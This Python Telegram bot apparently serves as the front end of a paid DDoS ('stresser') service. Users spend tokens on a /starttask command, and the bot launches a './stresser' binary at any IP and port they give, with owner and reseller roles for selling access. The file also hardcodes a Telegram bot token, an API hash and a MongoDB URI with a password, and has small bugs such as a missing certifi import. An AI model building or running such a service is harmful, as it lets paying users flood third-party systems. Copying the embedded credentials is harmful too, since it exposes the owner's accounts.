from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
import subprocess
import threading
from datetime import datetime

# Hardcoded API credentials
API_ID = 23227192  # Replace with your Telegram API ID
API_HASH = "7c3b59c3bb3429025f76b6840c7b7bf0"  # Replace with your Telegram API Hash
BOT_TOKEN = "7203086623:AAHXuhtp7qOFxOcsgGZIXnPtTfix8LYSn1M"  # Replace with your bot token

# MongoDB setup (Replace with your MongoDB URI and database name)
MONGO_URI = "mongodb+srv://Ageon:vQXSBs8M73gWVYzt@cluster0.ltsfi.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'"
DATABASE_NAME = "AGEON"
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client[DATABASE_NAME]

# Collections
users_collection = db["users"]
tasks_collection = db["tasks"]
logs_collection = db["logs"]

# Initialize Pyrogram client
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Simulated task binary (replace with your actual binary path)
TASK_BINARY = "./stresser"  # Replace with the path to your compiled C binary

# Owner and Reseller IDs
OWNER_ID = 7816069263  # Replace with your Telegram ID
RESELLER_IDS = [987654321]  # Replace with reseller Telegram IDs

# Log actions to the database
def log_action(user_id, action):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logs_collection.insert_one({"user_id": user_id, "action": action, "timestamp": timestamp})

# Execute a task in a separate thread
def execute_task(task_id, ip, port, method, duration):
    try:
        # Run the task binary (C program)
        process = subprocess.Popen([TASK_BINARY, ip, str(port), method, str(duration)])
        process.wait()

        # Update task status in the database after completion
        tasks_collection.update_one(
            {"_id": task_id},
            {"$set": {"status": "completed", "end_time": datetime.now()}}
        )

    except Exception as e:
        print(f"Error during task execution: {e}")

# Start command
@app.on_message(filters.command("start"))
def start(client, message):
    user_id = message.from_user.id
    username = message.from_user.username

    # Add user to database if not exists
    if not users_collection.find_one({"user_id": user_id}):
        users_collection.insert_one({"user_id": user_id, "username": username, "tokens": 0, "role": "member", "banned": False})

    # Welcome message based on role
    user_data = users_collection.find_one({"user_id": user_id})
    role = user_data.get("role", "member")

    if user_id == OWNER_ID:
        welcome_message = "🌟 Welcome back, Owner! Use /help to see available commands."
    elif user_id in RESELLER_IDS:
        welcome_message = "🌟 Welcome back, Reseller! Use /help to see available commands."
    else:
        welcome_message = "🌟 Welcome to the bot! Use /help to see available commands."

    log_action(user_id, "started the bot")
    message.reply_text(welcome_message + "\n\nBot made by @AGEON_OWNER")

# Help command
@app.on_message(filters.command("help"))
def help(client, message):
    user_id = message.from_user.id

    user_data = users_collection.find_one({"user_id": user_id})
    role = user_data.get("role", "member")

    if role == "owner":
        help_text = """
        👑 **Owner Commands:**
        /starttask [IP] [PORT] [METHOD] [DURATION] - Start a task
        /stoptask [ID] - Stop a task
        /addtokens [ID] [AMOUNT] - Add tokens to a user
        /ban [ID] - Ban a user
        /unban [ID] - Unban a user
        /addreseller [ID] - Grant reseller privileges
        /removereseller [ID] - Remove reseller privileges
        /listusers - List all users
        /runningtasks - Show running tasks
        """
    elif role == "reseller":
        help_text = """
        💼 **Reseller Commands:**
        /starttask [IP] [PORT] [METHOD] [DURATION] - Start a task
        /addtokens [ID] [AMOUNT] - Add tokens to a user
        /listusers - List all users
        """
    else:
        help_text = """
        👤 **Member Commands:**
        /starttask [IP] [PORT] [METHOD] [DURATION] - Start a task
        /checktokens - Check your token balance
        """

    message.reply_text(help_text + "\n\nBot made by @AGEON_OWNER")

# Start Task command for stress testing
@app.on_message(filters.command("starttask"))
def start_task(client, message):
    user_id = message.from_user.id
    args = message.text.split()

    if len(args) < 5:
        message.reply_text("❌ Usage: /starttask [IP] [PORT] [METHOD] [DURATION]")
        return

    ip = args[1]
    port = int(args[2])
    method = args[3]
    duration = int(args[4])  # Duration in seconds

    # Deduct tokens from the user's account (if applicable)
    user_data = users_collection.find_one({"user_id": user_id})
    
    if not user_data or user_data["tokens"] <= 0:
        message.reply_text("❌ You don't have enough tokens to start a task.")
        return

    users_collection.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})

    # Log the task in the database and start it in a separate thread
    task_id = tasks_collection.insert_one({
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "method": method,
        "duration": duration,
        "status": "running",
        "start_time": datetime.now(),
        "end_time": None,
    }).inserted_id

    threading.Thread(target=execute_task, args=(task_id, ip, port, method, duration)).start()
    
    message.reply_text(f"🚀 Stress test started on `{ip}:{port}` using `{method}` for `{duration}` seconds.")

# Check Tokens command for members and resellers
@app.on_message(filters.command("checktokens"))
def check_tokens(client, message):
    user_id = message.from_user.id

    user_data = users_collection.find_one({"user_id": user_id})
    
    if not user_data:
        message.reply_text("❌ You are not registered.")
        return

    tokens = user_data.get("tokens", 0)
    
    message.reply_text(f"💰 You have `{tokens}` tokens remaining.\n\nBot made by @AGEON_OWNER")

# List Users command for admins and resellers
@app.on_message(filters.command("listusers"))
def list_users(client, message):
    user_id = message.from_user.id

    admin_roles = ["owner", "reseller"]
    
    user_data = users_collection.find_one({"user_id": user_id})
    
    if not user_data or user_data.get("role") not in admin_roles:
        message.reply_text("❌ You don't have permission to list users.")
        return

    all_users = users_collection.find()
    
    response_texts = []
    
    for u in all_users:
      response_texts.append(f"🆔 ID: {u['user_id']}, 📛 Name: {u['username']}, 🎭 Role: {u['role']}, 🚦 Status: {'Banned' if u['banned'] else 'Active'}")
    
      response_texts_str = "\n".join(response_texts)

      if response_texts_str.strip():
          message.reply_text(f"👥 **User List:**\n{response_texts_str}\n\nBot made by @AGEON_OWNER")

# Run the bot
app.run()
